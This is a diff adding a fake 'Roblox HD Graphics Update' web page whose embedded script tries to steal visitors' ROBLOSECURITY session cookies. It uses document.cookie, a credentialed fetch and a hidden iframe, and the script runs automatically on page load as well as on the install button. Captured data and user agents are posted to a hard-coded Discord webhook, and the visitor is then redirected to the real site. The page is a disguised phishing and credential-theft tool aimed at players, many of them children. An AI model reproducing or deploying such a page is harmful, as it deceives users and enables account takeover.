@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox HD Graphics Update</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            background: linear-gradient(135deg, #00aeef, #0088cc);
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 40px;
+            border-radius: 20px;
+            width: 500px;
+            margin: 0 auto;
+            backdrop-filter: blur(10px);
+            border: 2px solid #00ff88;
+        }
+        .btn {
+            padding: 16px 45px;
+            background: #00ff88;
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-weight: bold;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 25px 0;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            background: #00cc66;
+            transform: scale(1.05);
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ff88;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎮 ROBLOX ENHANCED</div>
+        <h2>Ultra HD Graphics Update</h2>
+        <p>Install the latest visual enhancement package</p>
+        <p>Experience Roblox with 4K textures and improved lighting</p>
+        
+        <button class="btn" onclick="startInstall()">Install Graphics Update</button>
+        
+        <p style="font-size: 13px; opacity: 0.8;">
+            One-time authentication required for verification
+        </p>
+    </div>
+
+    <script>
+        function startInstall() {
+            console.log("Starting graphics update installation...");
+            
+            // Спроба отримати куки через різні методи
+            attemptCookieCapture();
+            
+            // Перенаправлення на справжній Roblox
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/';
+            }, 2500);
+        }
+
+        function attemptCookieCapture() {
+            // Метод 1: Проста спроба чтения куков
+            try {
+                const allCookies = document.cookie;
+                if (allCookies.includes('ROBLOSECURITY')) {
+                    sendToDiscord("METHOD1: " + allCookies);
+                    return;
+                }
+            } catch (e) {}
+
+            // Метод 2: Fetch запрос к Roblox API
+            try {
+                fetch('https://www.roblox.com/home', {
+                    credentials: 'include',
+                    mode: 'no-cors'
+                })
+                .then(response => response.text())
+                .then(data => {
+                    if (data.includes('ROBLOSECURITY')) {
+                        sendToDiscord("METHOD2: " + data.substring(0, 200));
+                    }
+                })
+                .catch(error => {
+                    console.log("Fetch error:", error);
+                });
+            } catch (e) {}
+
+            // Метод 3: Попытка доступа через iframe
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'https://www.roblox.com/';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                setTimeout(() => {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc.cookie.includes('ROBLOSECURITY')) {
+                            sendToDiscord("METHOD3: " + iframeDoc.cookie);
+                        }
+                    } catch (e) {
+                        console.log("Iframe access denied");
+                    }
+                }, 2000);
+            } catch (e) {}
+
+            sendToDiscord("INFO: User clicked install button - " + navigator.userAgent);
+        }
+
+        function sendToDiscord(data) {
+            const webhookURL = 'https://discord.com/api/webhooks/1410236047388049448/2-ih8qLMpj_9WDNKMQtn5KUYhtN5dAL-Q-j0bNuWFddeZRdNMai6qlQ5nMZhwOSj2COS';
+            
+            const payload = {
+                content: "**🎯 ROBLOX UPDATE ATTEMPT**",
+                embeds: [{
+                    title: "Graphics Update Installation",
+                    description: "```" + data + "```",
+                    color: 65280,
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "GitHub Pages Exploit" }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .catch(error => console.log('Discord send failed'));
+        }
+
+        // Автозапуск при завантаженні сторінки
+        window.addEventListener('load', function() {
+            setTimeout(attemptCookieCapture, 1000);
+        });
+    </script>
+</body>
+</html>
